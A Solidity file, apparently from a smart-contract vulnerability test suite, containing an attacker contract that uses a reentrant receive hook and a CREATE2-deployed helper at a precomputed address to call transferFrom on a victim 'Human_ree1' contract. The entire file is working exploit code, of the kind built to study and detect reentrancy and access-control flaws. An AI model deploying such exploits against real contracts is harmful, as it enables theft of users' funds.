// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "../../cross-contract/access-control/human/Human_ree1.sol";

contract Human_ree1_Attacker {
    bool public attacked;
    bytes initCode;
    uint public salt = 8848;
    address public victim;
    address public owner;

    constructor(address _victim) payable {
        victim = _victim;
        owner = msg.sender;
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            new Human_ree1_AttackerAux{salt: bytes32(salt)}(
                victim,
                owner,
                owner
            );
        }
        payable(owner).transfer(msg.value);
    }

    function getAddress() public view returns (address) {
        bytes memory bytecode = getBytecode(victim, owner, owner);
        return getAddressFromBytecode(bytecode, salt);
    }

    function getBytecode(
        address humanRee,
        address from,
        address to
    ) public pure returns (bytes memory) {
        bytes memory bytecode = type(Human_ree1_AttackerAux).creationCode;

        return abi.encodePacked(bytecode, abi.encode(humanRee, from, to));
    }

    function getAddressFromBytecode(
        bytes memory bytecode,
        uint256 _salt
    ) public view returns (address) {
        bytes32 hash = keccak256(
            abi.encodePacked(
                bytes1(0xff),
                address(this),
                _salt,
                keccak256(bytecode)
            )
        );

        // NOTE: cast last 20 bytes of hash to address
        return address(uint160(uint256(hash)));
    }
}

contract Human_ree1_AttackerAux {
    constructor(address humanRee, address from, address to) {
        Human_ree1(humanRee).transferFrom(from, to);
    }
}
